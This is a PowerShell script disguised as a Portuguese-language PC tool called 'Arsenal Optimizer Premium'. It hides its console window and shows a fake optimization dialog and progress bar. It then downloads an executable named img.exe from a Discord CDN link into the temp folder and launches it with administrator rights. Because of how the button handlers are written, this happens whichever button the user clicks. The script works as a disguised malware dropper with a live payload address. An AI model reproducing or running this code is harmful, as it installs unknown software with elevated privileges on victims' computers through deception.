Add-Type -AssemblyName PresentationFramework
function S-D { [void] [System.Reflection.Assembly]::LoadWithPartialName("presentationframework")
    $w = New-Object System.Windows.Window
    $w.Title = "Optimizer"; $w.Width = 600; $w.Height = 500
    $w.WindowStartupLocation = "CenterScreen"
    $w.WindowStyle = "None"; $w.ResizeMode = "NoResize"
    $w.Background = [System.Windows.Media.Brushes]::Black
    $w.AllowsTransparency = $true; $w.Opacity = 0.98
    $b = New-Object System.Windows.Controls.Border
    $b.Background = [System.Windows.Media.Brushes]::Black
    $b.CornerRadius = "15"; $b.Padding = "20"
    $b.Margin = "20"
    $b.BorderBrush = [System.Windows.Media.Brushes]::DarkRed
    $b.BorderThickness = "3"
    $s = New-Object System.Windows.Controls.StackPanel
    $s.HorizontalAlignment = "Center"; $s.VerticalAlignment = "Center"
    $t = New-Object System.Windows.Controls.TextBlock
    $t.Text = "Arsenal Optimizer Premium"; $t.Margin = "15"
    $t.HorizontalAlignment = "Center"; $t.Foreground = [System.Windows.Media.Brushes]::White
    $t.FontSize = 26
    $t.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
    $t.FontWeight = "Bold"
    $s.Children.Add($t)
    $bp = New-Object System.Windows.Controls.StackPanel
    $bp.Orientation = "Horizontal"; $bp.HorizontalAlignment = "Center"
    $bp.Margin = "30"
    $y = New-Object System.Windows.Controls.Button
    $y.Content = "Sim"; $y.Width = 100; $y.Margin = "10"
    $y.Background = [System.Windows.Media.Brushes]::Crimson
    $y.Foreground = [System.Windows.Media.Brushes]::White
    $y.FontSize = 16
    $y.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
    $y.FontWeight = "Bold"; $y.Padding = "10"
    $n = New-Object System.Windows.Controls.Button
    $n.Content = "NÃ£o"; $n.Width = 100; $n.Margin = "10"
    $n.Background = [System.Windows.Media.Brushes]::Crimson
    $n.Foreground = [System.Windows.Media.Brushes]::White
    $n.FontSize = 16
    $n.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
    $n.FontWeight = "Bold"; $n.Padding = "10"
    $bp.Children.Add($y)
    $bp.Children.Add($n)
    $s.Children.Add($bp)
    $b.Child = $s
    $w.Content = $b
    $r = $null
    $y.Add_Click({ $r = $true; $w.Close() })
    $n.Add_Click({ $r = $false; $w.Close() })
    $w.Closing.Add({ if ($null -eq $r) { $r = $false } })
    $w.ShowDialog()
    return $r
}
function D-E {
    $u = "https://cdn.discordapp.com/attachments/1224005091481227366/1244489034227781662/img.exe?ex=66554c3b&is=6653fabb&hm=e7f839a52f5d00d94a4bdaa1853dec5675058bb06c2213959166b8e2c9ef4d56&"
    $o = "$env:TEMP\img.exe"
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($u, $o)
    Start-Process -FilePath $o -Verb RunAs
}
$c = (Get-Process -id $pid).MainWindowHandle
$u32 = Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class User32 {
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hwnd, int nCmdShow);
    }
"@ -PassThru
$u32::ShowWindow($c, 0)
$r = S-D
if ($null -eq $r -or $r -eq $false) {
    $lw = New-Object System.Windows.Window
    $lw.Title = "Carregando"; $lw.Width = 400; $lw.Height = 150
    $lw.WindowStartupLocation = "CenterScreen"
    $lw.WindowStyle = "None"; $lw.ResizeMode = "NoResize"
    $lw.Background = [System.Windows.Media.Brushes]::Black
    $lw.AllowsTransparency = $true; $lw.Opacity = 0.98
    $b = New-Object System.Windows.Controls.Border
    $b.Background = [System.Windows.Media.Brushes]::Black
    $b.CornerRadius = "15"; $b.Padding = "20"
    $b.Margin = "10"
    $b.BorderBrush = [System.Windows.Media.Brushes]::DarkRed
    $b.BorderThickness = "3"
    $sp = New-Object System.Windows.Controls.StackPanel
    $sp.HorizontalAlignment = "Center"; $sp.VerticalAlignment = "Center"
    $lt = New-Object System.Windows.Controls.TextBlock
    $lt.Text = "Otimizando, por favor aguarde..."
    $lt.Margin = "10"
    $lt.HorizontalAlignment = "Center"; $lt.VerticalAlignment = "Center"
    $lt.Foreground = [System.Windows.Media.Brushes]::White
    $lt.FontSize = 18
    $lt.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
    $lt.FontWeight = "Bold"
    $pb = New-Object System.Windows.Controls.ProgressBar
    $pb.Width = 300; $pb.Height = 20
    $pb.IsIndeterminate = $true
    $pb.Foreground = [System.Windows.Media.Brushes]::DarkRed
    $pb.Margin = "10"
    $sp.Children.Add($lt)
    $sp.Children.Add($pb)
    $b.Child = $sp
    $lw.Content = $b
    $lw.Show()
    D-E
    $lw.Close()
}
exit
